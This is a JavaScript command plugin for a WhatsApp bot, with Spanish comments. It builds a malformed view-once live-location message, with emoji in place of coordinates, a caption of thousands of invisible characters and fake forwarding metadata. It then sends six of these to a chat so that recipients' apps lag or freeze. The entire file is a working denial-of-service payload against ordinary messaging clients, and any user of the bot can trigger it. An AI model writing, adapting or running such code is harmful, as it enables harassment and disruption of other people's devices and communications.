const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '🔥',
        degreesLongitude: '🌪️',
        caption: ('\u2063💥').repeat(5000), // mezcla caracteres invisibles con emojis
        sequenceNumber: String(Math.floor(Math.random() * 10000)),
        jpegThumbnail: Buffer.alloc(3 * 1024, 0), // miniatura ligera
        contextInfo: {
          forwardingScore: Math.floor(Math.random() * 200),
          isForwarded: true,
          externalAdReply: {
            title: 'Lag Prolongado',
            body: 'Lag que dura varios segundos',
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn }) => {
  const jid = m.chat
  const times = 6 // envía 6 mensajes para prolongar el lag

  await m.reply(`⚠️ Preparando ${times} mensajes para lag prolongado...`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 300)) // más tiempo entre mensajes
    } catch (error) {
      console.error('Error al enviar mensaje:', error)
      await m.reply('❗ Error al enviar mensaje.')
      return
    }
  }

  await m.reply('✅ *Lag prolongado completo.*')
}

handler.command = /^lagchat$/i
handler.owner = false

export default handler